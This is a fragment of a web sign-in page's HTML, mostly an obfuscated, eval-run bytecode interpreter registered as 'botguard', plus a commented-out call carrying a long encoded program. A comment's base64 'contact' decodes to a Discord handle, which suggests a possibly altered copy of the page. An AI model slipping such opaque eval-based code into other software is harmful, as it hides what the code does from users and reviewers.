            var paramsStr = langChooser_getParamStr(langChooser_params);
            var newHref = langChooser_currentPath + "?" + paramsStr;
            if (langChooser_fragment) {
              newHref = newHref + "#" + langChooser_fragment;
            }
            window.location.href = newHref;
          };
        }
      })();
    </script>
<script type="text/javascript">
  var gaia_attachEvent = function(element, event, callback) {
  if (element.addEventListener) {
  element.addEventListener(event, callback, false);
  } else if (element.attachEvent) {
  element.attachEvent('on' + event, callback);
  }
  };
</script>
  <script type="text/javascript">/* Anti-spam. Want to say hello? Contact (base64) bm9ydGhzdGFydHdvIG9uIERpc2NvcmQ= */(function(){eval('var g,k=true,m=null,p=false,q=this,u="",v=void 0,w=Array.prototype,aa=Date.now||function(){return+new Date},x=function(a){return(a=q.document)?a.documentMode:v},y=function(a,b){return a<b?-1:a>b?1:0},z=function(a,b,c,d,e){c=a.split("."),d=q,c[0]in d||!d.execScript||d.execScript("var "+c[0]);for(;c.length&&(e=c.shift());)c.length||b===v?d=d[e]?d[e]:d[e]={}:d[e]=b},ba=w.indexOf?function(a,b,c){return w.indexOf.call(a,b,c)}:function(a,b,c){if(c=c==m?0:0>c?Math.max(0,a.length+c):c,"string"==typeof a)return"string"==typeof b&&1==b.length?a.indexOf(b,c):-1;for(;c<a.length;c++)if(c in a&&a[c]===b)return c;return-1},A=function(a,b,c){if(b=typeof a,"object"==b)if(a){if(a instanceof Array)return"array";if(a instanceof Object)return b;if(c=Object.prototype.toString.call(a),"[object Window]"==c)return"object";if("[object Array]"==c||"number"==typeof a.length&&"undefined"!=typeof a.splice&&"undefined"!=typeof a.propertyIsEnumerable&&!a.propertyIsEnumerable("splice"))return"array";if("[object Function]"==c||"undefined"!=typeof a.call&&"undefined"!=typeof a.propertyIsEnumerable&&!a.propertyIsEnumerable("call"))return"function"}else return"null";else if("function"==b&&"undefined"==typeof a.call)return"object";return b},B=/\\b(?:MSIE|rv)[: ]([^\\);]+)(\\)|;)/.exec(q.navigator?q.navigator.userAgent:m),u=B?B[1]:"",ca=x(),da=ca>parseFloat(u)?String(ca):u,ea={},fa=q.document,C=function(a,b,c,d,e,f,h,l,n,s,r,t){if(!(b=ea[a])){for(b=0,c=String(da).replace(/^[\\s\\xa0]+|[\\s\\xa0]+$/g,"").split("."),d=String(a).replace(/^[\\s\\xa0]+|[\\s\\xa0]+$/g,"").split("."),e=Math.max(c.length,d.length),f=0;0==b&&f<e;f++){h=c[f]||"",l=d[f]||"",n=RegExp("(\\\\d*)(\\\\D*)","g"),s=RegExp("(\\\\d*)(\\\\D*)","g");do{if(r=n.exec(h)||["","",""],t=s.exec(l)||["","",""],0==r[0].length&&0==t[0].length)break;b=y(0==r[1].length?0:parseInt(r[1],10),0==t[1].length?0:parseInt(t[1],10))||y(0==r[2].length,0==t[2].length)||y(r[2],t[2])}while(0==b)}b=ea[a]=0<=b}return b},ga=fa?x()||("CSS1Compat"==fa.compatMode?parseInt(da,10):5):v,D=(C("9"),new function(){aa()},m),E=m,G=m,H=9<=ga,ha=function(a){if(!D)for(D={},E={},G={},a=0;65>a;a++)D[a]="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=".charAt(a),E[D[a]]=a,G[a]="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_.".charAt(a)},ia=function(a,b,c,d,e){for(a=a.replace(/\\r\\n/g,"\\n"),b=[],d=c=0;d<a.length;d++)e=a.charCodeAt(d),128>e?b[c++]=e:(2048>e?b[c++]=e>>6|192:(b[c++]=e>>12|224,b[c++]=e>>6&63|128),b[c++]=e&63|128);return b},ja=!C("9"),I=(C("8"),C("9"),function(a,b){this.type=a,this.currentTarget=this.target=b,this.defaultPrevented=p}),J=(I.prototype.preventDefault=function(){this.defaultPrevented=k},function(a,b,c,d){I.call(this,a?a.type:""),this.relatedTarget=this.currentTarget=this.target=m,this.charCode=this.keyCode=this.button=this.screenY=this.screenX=this.clientY=this.clientX=this.offsetY=this.offsetX=0,this.metaKey=this.shiftKey=this.altKey=this.ctrlKey=p,this.Y=this.state=m,a&&(c=this.type=a.type,this.currentTarget=b,d=a.relatedTarget,this.target=a.target||a.srcElement,d||("mouseover"==c?d=a.fromElement:"mouseout"==c&&(d=a.toElement)),this.relatedTarget=d,this.Y=a,this.button=a.button,this.ctrlKey=a.ctrlKey,this.altKey=a.altKey,this.shiftKey=a.shiftKey,this.metaKey=a.metaKey,this.state=a.state,this.screenX=a.screenX||0,this.screenY=a.screenY||0,this.keyCode=a.keyCode||0,this.offsetX=a.offsetX!==v?a.offsetX:a.layerX,this.offsetY=a.offsetY!==v?a.offsetY:a.layerY,this.clientX=a.clientX!==v?a.clientX:a.pageX,this.clientY=a.clientY!==v?a.clientY:a.pageY,this.charCode=a.charCode||("keypress"==c?a.keyCode:0),a.defaultPrevented&&this.preventDefault())}),ka=(function(){function a(){}a.prototype=I.prototype,J.pa=I.prototype,J.prototype=new a,J.ta=function(a,c,d,e){return e=Array.prototype.slice.call(arguments,2),I.prototype[c].apply(a,e)}}(),J.prototype.preventDefault=function(a){if(J.pa.preventDefault.call(this),a=this.Y,a.preventDefault)a.preventDefault();else if(a.returnValue=p,ja)try{if(a.ctrlKey||112<=a.keyCode&&123>=a.keyCode)a.keyCode=-1}catch(b){}},"closure_listenable_"+(1E6*Math.random()|0)),la=0,ma=function(a){try{return!(!a||!a[ka])}catch(b){return p}},K=function(a){this.src=a,this.l={},this.M=0},na=function(a){a.s=k,a.k=m,a.t=m,a.src=m,a.K=m},oa=function(a,b,c,d,e){this.k=a,this.t=m,this.src=b,this.type=c,this.K=e,this.capture=!!d,this.key=++la,this.s=this.L=p},L=(K.prototype.add=function(a,b,c,d,e,f,h,l){f=this.l[a],f||(f=this.l[a]=[],this.M++);t:{for(h=0;h<f.length;++h)if(l=f[h],!l.s&&l.k==b&&l.capture==!!d&&l.K==e)break t;h=-1}return-1<h?(a=f[h],c||(a.L=p)):(a=new oa(b,this.src,a,!!d,e),a.L=c,f.push(a)),a},"closure_lm_"+(1E6*Math.random()|0)),M={},pa=0,qa=function(a){return a=a[L],a instanceof K?a:m},ta=function(a,b){return a=sa,b=H?function(c){return a.call(b.src,b.k,c)}:function(c){if(c=a.call(b.src,b.k,c),!c)return c}},sa=function(a,b,c,d,e){if(a.s)return k;if(!H){if(!(c=b))t:{for(d=q,c=["window","event"];e=c.shift();)if(d[e]!=m)d=d[e];else{c=m;break t}c=d}return c=new J(c,this),d=k,d=ua(a,c)}return ua(a,new J(b,this))},N=function(a,b,c,d,e,f,h){if("array"==A(b))for(f=0;f<b.length;f++)N(a,b[f],c,d,e);else if(c=va(c),ma(a))a.sa(b,c,d,e);else{if(!b)throw Error("Invalid event type");if(f=!!d,!f||H)(h=qa(a))||(a[L]=h=new K(a)),c=h.add(b,c,p,d,e),c.t||(d=ta(),c.t=d,d.src=a,d.k=c,a.addEventListener?a.addEventListener(b,d,f):a.attachEvent(b in M?M[b]:M[b]="on"+b,d),pa++)}},ua=function(a,b,c,d,e,f,h,l,n,s){if(c=a.k,d=a.K||a.src,a.L&&"number"!=typeof a&&a&&!a.s)if(e=a.src,ma(e))e.ra(a);else if(f=a.type,h=a.t,e.removeEventListener?e.removeEventListener(f,h,a.capture):e.detachEvent&&e.detachEvent(f in M?M[f]:M[f]="on"+f,h),pa--,f=qa(e)){if(h=a.type,l=h in f.l)l=f.l[h],n=ba(l,a),(s=0<=n)&&w.splice.call(l,n,1),l=s;l&&(na(a),0==f.l[h].length&&(delete f.l[h],f.M--)),0==f.M&&(f.src=m,e[L]=m)}else na(a);return c.call(d,b)},wa="__closure_events_fn_"+(1E9*Math.random()>>>0),O=function(a,b){a.o=("E:"+b.message+":"+b.stack).slice(0,2048)},va=function(a){return"function"==A(a)?a:a[wa]||(a[wa]=function(b){return a.handleEvent(b)})},xa=function(a,b){for(b=Array(a);a--;)b[a]=255*Math.random()|0;return b},P=function(a,b){return a[b]<<24|a[b+1]<<16|a[b+2]<<8|a[b+3]},ya=function(a,b){a.T.push(a.c.slice()),a.c[a.b]=v,Q(a,a.b,b)},za=function(a,b,c){return c=function(){return a},b=function(){return c()},b.ca=function(b){a=b},b},Ba=function(a,b,c,d){return function(){if(!d||a.w)return Q(a,a.W,arguments),Q(a,a.m,c),Aa(a,b)}},R=function(a,b,c,d){for(c=[],d=b-1;0<=d;d--)c[b-1-d]=a>>8*d&255;return c},Aa=function(a,b,c,d){return c=a.a(a.b),a.f&&c<a.f.length?(Q(a,a.b,a.f.length),ya(a,b)):Q(a,a.b,b),d=a.B(),Q(a,a.b,c),d},T=function(a,b,c,d){for(b={},b.I=a.a(S(a)),b.J=S(a),c=S(a)-1,d=S(a),b.self=a.a(d),b.r=[];c--;)d=S(a),b.r.push(a.a(d));return b},Y=function(a,b){return b<=a.ka?b==a.h||b==a.d||b==a.g||b==a.u?a.p:b==a.W||b==a.Q||b==a.R||b==a.m?a.F:b==a.G?a.i:4:[1,2,4,a.p,a.F,a.i][b%a.la]},Ca=function(a,b,c,d){try{for(d=0;84941944608!=d;)a+=(b<<4^b>>>5)+b^d+c[d&3],d+=2654435769,b+=(a<<4^a>>>5)+a^d+c[d>>>11&3];return[a>>>24,a>>16&255,a>>8&255,a&255,b>>>24,b>>16&255,b>>8&255,b&255]}catch(e){throw e;}},Q=function(a,b,c){if(b==a.b||b==a.n)a.c[b]?a.c[b].ca(c):a.c[b]=za(c);else if(b!=a.d&&b!=a.g&&b!=a.h||!a.c[b])a.c[b]=Da(c,a.a);b==a.v&&(a.C=v,Q(a,a.b,a.a(a.b)+4))},S=function(a,b,c){if(b=a.a(a.b),!(b in a.f))throw a.e(a.fa),a.D;return a.C==v&&(a.C=P(a.f,b-4),a.H=v),a.H!=b>>3&&(a.H=b>>3,c=[0,0,0,a.a(a.v)],a.ga=Ca(a.C,a.H,c)),Q(a,a.b,b+1),a.f[b]^a.ga[b%8]},Da=function(a,b,c,d,e,f,h,l,n){return l=Z,e=Z.prototype,f=e.B,h=e.X,n=e.e,d=function(){return c()},c=function(a,r,t){for(t=0,a=d[e.N],r=a===b,a=a&&a[e.N];a&&a!=f&&a!=h&&a!=l&&a!=n&&20>t;)t++,a=a[e.N];return c[e.oa+r+!(!a+(t>>2))]},d[e.S]=e,c[e.na]=a,a=v,d},$=function(a,b,c,d,e,f){for(e=a.a(b),b=b==a.g?function(b,c,d,f){try{c=e.length,d=c-4>>3,e.ja!=d&&(e.ja=d,d=(d<<3)-4,f=[0,0,0,a.a(a.P)],e.ia=Ca(P(e,d),P(e,d+4),f)),e.push(e.ia[c&7]^b)}catch(r){throw r;}}:function(a){e.push(a)},d&&b(d&255),f=0,d=c.length;f<d;f++)b(c[f])},Z=function(a,b,c,d,e,f,h,l){try{if(this.j=2048,this.c=[],Q(this,this.b,0),Q(this,this.n,0),Q(this,this.v,0),Q(this,this.h,[]),Q(this,this.d,[]),Q(this,this.Q,"object"==typeof window?window:q),Q(this,this.R,this),Q(this,this.A,0),Q(this,this.O,0),Q(this,this.P,0),Q(this,this.g,xa(4)),Q(this,this.u,[]),Q(this,this.m,{}),this.w=k,a&&"!"==a[0])this.o=a;else{for(ha(),b=E,c=[],d=0;d<a.length;){if(e=b[a.charAt(d++)],f=d<a.length?b[a.charAt(d)]:0,++d,h=d<a.length?b[a.charAt(d)]:0,++d,l=d<a.length?b[a.charAt(d)]:0,++d,e==m||f==m||h==m||l==m)throw Error();c.push(e<<2|f>>4),64!=h&&(c.push(f<<4&240|h>>2),64!=l&&c.push(h<<6&192|l))}(this.f=c)&&this.f.length?(this.T=[],this.B()):this.e(this.Z)}}catch(n){O(this,n)}};g=Z.prototype,g.b=0,g.v=1,g.h=2,g.n=3,g.d=4,g.G=5,g.W=6,g.U=8,g.Q=9,g.R=10,g.A=11,g.O=12,g.P=13,g.g=14,g.u=15,g.m=16,g.ka=17,g.$=15,g.ha=12,g.aa=10,g.ba=42,g.la=6,g.i=-1,g.p=-2,g.F=-3,g.Z=17,g.da=21,g.q=22,g.ma=30,g.fa=31,g.ea=33,g.D={},g.N="caller",g.S="toString",g.oa=34,g.na=36,Z.prototype.a=function(a,b){if(b=this.c[a],b===v)throw this.e(this.ma,0,a),this.D;return b()},Z.prototype.wa=function(a,b,c,d){d=a[(b+2)%3],a[b]=a[b]-a[(b+1)%3]-d^(1==b?d<<c:d>>>c)},Z.prototype.va=function(a,b,c,d){if(3==a.length){for(c=0;3>c;c++)b[c]+=a[c];for(c=0,d=[13,8,13,12,16,5,3,10,15];9>c;c++)b[3](b,c%3,d[c])}},Z.prototype.xa=function(a,b){b.push(a[0]<<24|a[1]<<16|a[2]<<8|a[3]),b.push(a[4]<<24|a[5]<<16|a[6]<<8|a[7]),b.push(a[8]<<24|a[9]<<16|a[10]<<8|a[11])},Z.prototype.e=function(a,b,c,d){d=this.a(this.n),a=[a,d>>8&255,d&255],c!=v&&a.push(c),0==this.a(this.h).length&&(this.c[this.h]=v,Q(this,this.h,a)),b&&3<this.j&&(c="",b.message&&(c+=b.message),b.stack!=v&&(c+=": "+b.stack),c=c.slice(0,this.j-3),this.j-=c.length+3,c=ia(c),$(this,this.g,R(c.length,2).concat(c),this.ha))},g.V=[function(){},function(a,b,c,d,e){b=S(a),c=S(a),d=a.a(b),b=Y(a,b),e=Y(a,c),e==a.i||e==a.p?d=""+d:0<b&&(1==b?d&=255:2==b?d&=65535:4==b&&(d&=4294967295)),Q(a,c,d)},function(a,b,c,d,e,f,h,l,n){if(b=S(a),c=Y(a,b),0<c){for(d=0;c--;)d=d<<8|S(a);Q(a,b,d)}else if(c!=a.F){if(d=S(a)<<8|S(a),c==a.i)if(c="",a.c[a.G]!=v)for(e=a.a(a.G);d--;)f=e[S(a)<<8|S(a)],c+=f;else{for(c=Array(d),e=0;e<d;e++)c[e]=S(a);for(d=c,c=[],f=e=0;e<d.length;)h=d[e++],128>h?c[f++]=String.fromCharCode(h):191<h&&224>h?(l=d[e++],c[f++]=String.fromCharCode((h&31)<<6|l&63)):(l=d[e++],n=d[e++],c[f++]=String.fromCharCode((h&15)<<12|(l&63)<<6|n&63));c=c.join("")}else for(c=Array(d),e=0;e<d;e++)c[e]=S(a);Q(a,b,c)}},function(a){S(a)},function(a,b,c,d){b=S(a),c=S(a),d=S(a),c=a.a(c),b=a.a(b),Q(a,d,b[c])},function(a,b,c){b=S(a),c=S(a),b=a.a(b),Q(a,c,A(b))},function(a,b,c,d,e){b=S(a),c=S(a),d=Y(a,b),e=Y(a,c),c!=a.h&&(d==a.i&&e==a.i?(a.c[c]==v&&Q(a,c,""),Q(a,c,a.a(c)+a.a(b))):e==a.p&&(0>d?(b=a.a(b),d==a.i&&(b=ia(""+b)),c!=a.d&&c!=a.g&&c!=a.u||$(a,c,R(b.length,2)),$(a,c,b)):0<d&&$(a,c,R(a.a(b),d))))},function(a,b,c){b=S(a),c=S(a),Q(a,c,function(a){return eval(a)}(a.a(b)))},function(a,b,c){b=S(a),c=S(a),Q(a,c,a.a(c)-a.a(b))},function(a,b){b=T(a),Q(a,b.J,b.I.apply(b.self,b.r))},function(a,b,c){b=S(a),c=S(a),Q(a,c,a.a(c)%a.a(b))},function(a,b,c,d,e){b=S(a),c=a.a(S(a)),d=a.a(S(a)),e=a.a(S(a)),b=a.a(b),N(b,c,Ba(a,d,e,k))},function(a,b,c,d){b=S(a),c=S(a),d=S(a),a.a(b)[a.a(c)]=a.a(d)},function(a,b,c,d,e){b=T(a),c=b.r,d=b.self,e=b.I;switch(c.length){case 0:c=d[e]();break;case 1:c=d[e](c[0]);break;case 2:c=d[e](c[0],c[1]);break;case 3:c=d[e](c[0],c[1],c[2]);break;default:a.e(a.q);return}Q(a,b.J,c)},function(a,b,c){b=S(a),c=S(a),Q(a,c,a.a(c)+a.a(b))},function(a,b,c){b=S(a),c=S(a),0!=a.a(b)&&Q(a,a.b,a.a(c))},function(a,b,c,d){b=S(a),c=S(a),d=S(a),a.a(b)==a.a(c)&&Q(a,d,a.a(d)+1)},function(a,b,c,d){b=S(a),c=S(a),d=S(a),a.a(b)>a.a(c)&&Q(a,d,a.a(d)+1)},function(a,b,c,d){b=S(a),c=S(a),d=S(a),Q(a,d,a.a(b)<<c)},function(a,b,c,d){b=S(a),c=S(a),d=S(a),Q(a,d,a.a(b)|a.a(c))},function(a,b){b=a.a(S(a)),ya(a,b)},function(a,b,c,d){if(b=a.T.pop()){for(c=S(a);0<c;c--)d=S(a),b[d]=a.c[d];a.c=b}else Q(a,a.b,a.f.length)},function(a,b,c,d){b=S(a),c=S(a),d=S(a),Q(a,d,(a.a(b)in a.a(c))+0)},function(a,b,c,d){b=S(a),c=a.a(S(a)),d=a.a(S(a)),Q(a,b,Ba(a,c,d))},function(a,b,c){b=S(a),c=S(a),Q(a,c,a.a(c)*a.a(b))},function(a,b,c,d){b=S(a),c=S(a),d=S(a),Q(a,d,a.a(b)>>c)},function(a,b,c,d){b=S(a),c=S(a),d=S(a),Q(a,d,a.a(b)||a.a(c))},function(a,b,c,d,e){b=T(a),c=b.r,d=b.self,e=b.I;switch(c.length){case 0:c=new d[e];break;case 1:c=new d[e](c[0]);break;case 2:c=new d[e](c[0],c[1]);break;case 3:c=new d[e](c[0],c[1],c[2]);break;case 4:c=new d[e](c[0],c[1],c[2],c[3]);break;default:a.e(a.q);return}Q(a,b.J,c)},function(a,b,c,d,e,f){if(b=S(a),c=S(a),d=S(a),e=S(a),b=a.a(b),c=a.a(c),d=a.a(d),a=a.a(e),"object"==A(b)){for(f in e=[],b)e.push(f);b=e}for(e=0,f=b.length;e<f;e+=d)c(b.slice(e,e+d),a)}],Z.prototype.ua=function(a){return(a=window.performance)&&a.now?function(){return a.now()|0}:function(){return+new Date}}(),Z.prototype.qa=function(a,b){return b=this.X(),a&&a(b),b},Z.prototype.B=function(a,b,c,d,e,f){try{for(b=2001,c=v,d=0,a=this.f.length;--b&&(d=this.a(this.b))<a;)try{Q(this,this.n,d),e=S(this)%this.V.length,(c=this.V[e])?c(this):this.e(this.da,0,e)}catch(h){h!=this.D&&((f=this.a(this.A))?(Q(this,f,h),Q(this,this.A,0)):this.e(this.q,h))}b||this.e(this.ea)}catch(l){try{this.e(this.q,l)}catch(n){O(this,n)}}return this.a(this.m)},Z.prototype.X=function(a,b,c,d,e,f,h,l,n,s,r,t,U,ra,V,W,X,F){if(this.o)return this.o;try{for(this.w=p,b=this.a(this.d).length,c=this.a(this.g).length,d=this.j,this.c[this.U]&&Aa(this,this.a(this.U)),e=this.a(this.h),0<e.length&&$(this,this.d,R(e.length,2).concat(e),this.$),f=this.a(this.O)&255,f-=this.a(this.d).length+4,h=this.a(this.g),4<h.length&&(f-=h.length+3),0<f&&$(this,this.d,R(f,2).concat(xa(f)),this.aa),4<h.length&&$(this,this.d,R(h.length,2).concat(h),this.ba),l=[3].concat(this.a(this.d)),ha(),s=[],e=0;e<l.length;e+=3)r=l[e],U=(t=e+1<l.length)?l[e+1]:0,V=(ra=e+2<l.length)?l[e+2]:0,f=r>>2,X=V&63,h=(r&3)<<4|U>>4,W=(U&15)<<2|V>>6,ra||(X=64,t||(W=64)),s.push(G[f],G[h],G[W],G[X]);if(n=s=s.join("").replace(/\\./g,""))n="!"+n;else for(n="",s=0;s<l.length;s++)F=l[s][this.S](16),1==F.length&&(F="0"+F),n+=F;a=n,this.j=d,this.w=k,this.a(this.d).length=b,this.a(this.g).length=c}catch(Ea){O(this,Ea),a=this.o}return a};try{N(window,"unload",function(){})}catch(Fa){}z("botguard.bg",Z),z("botguard.bg.prototype.invoke",Z.prototype.qa);')})()</script>
  <script type="text/javascript">
  //document.bg = new botguard.bg('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